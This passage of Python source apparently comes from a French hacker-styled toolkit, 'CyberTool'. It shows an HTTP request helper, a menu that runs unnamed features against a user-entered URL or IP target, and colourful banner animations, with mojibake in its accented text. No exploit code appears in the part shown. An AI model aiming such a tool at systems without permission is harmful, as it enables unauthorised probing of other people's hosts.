            timeout (int)  : Temps d'attente maximal pour la requ√™te, par d√©faut 5 secondes.
        
        Retourne :
            dict : Contient "url", "status", "headers" et un √©chantillon du "content" (500 premiers caract√®res),
                   ou une cl√© "error" en cas de probl√®me.
        """
        try:
            # Correction de l'URL si n√©cessaire
            if not url.startswith("http"):
                url = f"http://{url}"
            # D√©finir un User-Agent par d√©faut si aucun header n'est fourni
            if headers is None:
                headers = {"User-Agent": "CyberTool/1.0"}
            response = requests.request(method, url, headers=headers, data=data, files=files, timeout=timeout)
            return {
                "url": url,
                "status": response.status_code,
                "headers": dict(response.headers),
                "content": response.text[:500]  # Limite √† 500 caract√®res pour l'affichage
            }
        except requests.exceptions.ConnectionError:
            return {"error": f"‚ùå Erreur de connexion √† {url}"}
        except requests.exceptions.Timeout:
            return {"error": f"‚åõ Timeout expir√© pour {url}"}
        except requests.exceptions.RequestException as e:
            return {"error": f"‚ùå Erreur HTTP : {str(e)}"}






    def display_features_table_hacker(self):
        """üíª Affiche un tableau interactif des fonctionnalit√©s dans un style hacker-full."""
        from rich.live import Live
        from rich.table import Table
        from time import sleep

        table = Table(
            title="[bold green]CYBER-TOOL FUNCTIONALITIES[/bold green]",
            title_style="bold green",
            border_style="green",
            style="green on black"
        )
        table.add_column("ID", justify="center", style="bold cyan")
        table.add_column("Feature", style="bold green")

        with Live(table, refresh_per_second=10, console=self.console):
            for idx, (feature, description) in enumerate(self.feature_map.items(), start=1):
                table.add_row(f"[bold cyan]{idx}[/bold cyan]", f"[bold green]{description}[/bold green]")
                sleep(0.02)  # üî• Effet ultra rapide et fluide

        self.console.print(table)  # Fixe le tableau apr√®s l'affichage


    def run_features(self, feature_name, target):
        """üöÄ Ex√©cute une fonctionnalit√© sp√©cifi√©e sur une cible donn√©e."""
        self.console.print(f"\n[bold magenta]üöÄ Ex√©cution de {feature_name} sur {target}...[/bold magenta]")
        feature_method = getattr(self, feature_name, None)

        if feature_method:
            result = feature_method(target)
            self.console.print("\n[bold green]üìú R√©sultat :[/bold green]")
            self.console.print(json.dumps(result, indent=4, ensure_ascii=False))
        else:
            self.console.print(f"‚ùå [bold red]Erreur : La fonctionnalit√© {feature_name} n'est pas disponible.[/bold red]")


    def run_tool_static(self):
        """üéÆ Affiche le menu statique et permet d'ex√©cuter des fonctionnalit√©s."""
        while True:
            cyberpunk_loading("Initialisation de Cyber-Tool", duration=1, style="bold magenta")
            self.display_features_table_hacker()  # üî• R√©g√©n√©ration automatique apr√®s chaque ex√©cution

            feature_choice = Prompt.ask("\n[bold cyan]üëâ Entrez l'ID de la fonctionnalit√© √† ex√©cuter (ou 'exit' pour quitter)[/bold cyan]")

            if feature_choice.lower() == "exit":
                self.console.print("\n[bold red]üëã CyberTool termin√©. √Ä bient√¥t ![/bold red]")
                break

            try:
                feature_choice = int(feature_choice)
                if 1 <= feature_choice <= len(self.feature_map):
                    feature_name = list(self.feature_map.keys())[feature_choice - 1]
                    target = Prompt.ask("[bold cyan]üéØ Entrez la cible (URL/IP) √† tester[/bold cyan]") 
                    self.run_features(feature_name, target)  # ‚úÖ Ex√©cution directe sur la cible choisie
                    Prompt.ask("\n[bold yellow]Appuyez sur Entr√©e pour revenir au menu...[/bold yellow]")  # üî• Pause avant r√©g√©n√©ration
                else:
                    self.console.print("‚ùå [bold red]ID invalide. Veuillez entrer un num√©ro valide.[/bold red]")
            except ValueError:
                self.console.print("‚ùå [bold red]Entr√©e invalide. Veuillez entrer un num√©ro.[/bold red]")






# üî• D√©tection des dimensions du terminal
TERMINAL_WIDTH, TERMINAL_HEIGHT = shutil.get_terminal_size((80, 24))

# üî• Couleurs funky multicolores fluo brillantes
CYBERPUNK_COLORS = ["bold magenta", "bold cyan", "bold yellow", "bold green", "bold red", "bold blue"]

# üî• Fonction pour afficher une banni√®re al√©atoire avec animation et couleurs al√©atoires
def animated_random_banner():
    import os, random, time
    # Liste des fichiers de banni√®re
    banner_files = ["banners1.txt", "banners2.txt", "banners3.txt", "banners4.txt", "banners5.txt"]
    # S√©lection al√©atoire d'un fichier de banni√®re
    selected_banner = random.choice(banner_files)
    banner_path = os.path.join("data", "banners", selected_banner)
    if os.path.exists(banner_path):
        with open(banner_path, "r", encoding="utf-8") as f:
            banner_lines = f.readlines()
        # Affichage anim√© ligne par ligne avec couleur al√©atoire
        for line in banner_lines:
            color = random.choice(CYBERPUNK_COLORS)
            styled_line = f"[{color}]{line.strip().center(TERMINAL_WIDTH)}[/]"
            console.print(styled_line)
            time.sleep(0.03)
    else:
        console.print("[bold red]‚ö†Ô∏è ERREUR : Le fichier de banni√®re s√©lectionn√© est introuvable ![/bold red]")

# üî• Fonction pour afficher "D√©velopp√© par Karim" avec des couleurs al√©atoires
def animated_karim():
    import random
    karim_text = (
        f"[{random.choice(CYBERPUNK_COLORS)}]D[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]√©[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]v[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]e[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]l[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]o[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]p[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]p[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]√©[/]"
        f"[bold white] par [/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]K[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]A[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]R[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]I[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]M[/]"
    )
    console.print(Panel(karim_text, border_style="green", title="[bold cyan]INFO[/bold cyan]"), justify="left")

# üî• Fonction pour un chargement cyberpunk optimis√©
def cyberpunk_loading(task_name, duration=2, style="bold cyan", spinner="dots"):
    from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, SpinnerColumn
    with Progress(
        SpinnerColumn(spinner),
        TextColumn(f"[bold {style}]‚è≥ {{task.fields[title]}}...[/bold {style}]"),
        BarColumn(bar_width=50, style=style),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("", total=duration, title=task_name)
        for _ in range(duration):
            time.sleep(0.7)
            progress.update(task, advance=1)





if __name__ == "__main__":
    console.clear()  # Nettoyage complet du terminal

    # G√©n√©rer un th√®me de couleurs al√©atoire √† partir d'une liste plus large
    import random
    ALL_COLORS = [
        "bold magenta", "bold cyan", "bold yellow", "bold green", "bold red", "bold blue",
        "bold white", "bold bright_green", "bold bright_red", "bold bright_yellow",
        "bold bright_blue", "bold bright_magenta"
    ]
    # S√©lectionne 6 couleurs au hasard pour le th√®me Cyber-Tool
    CYBERPUNK_COLORS = random.sample(ALL_COLORS, 6)

    # Affichage d'une banni√®re al√©atoire utilisant le nouveau th√®me
    animated_random_banner()  # Cette fonction doit utiliser la variable CYBERPUNK_COLORS pour chaque ligne
    animated_karim()         # Affichage de "D√©velopp√© par Karim" en utilisant √©galement le th√®me al√©atoire

    cyber_tool = CyberTool()  # Initialisation de Cyber-Tool
    cyber_tool.run_tool_static()  # Lancement du menu interactif statique
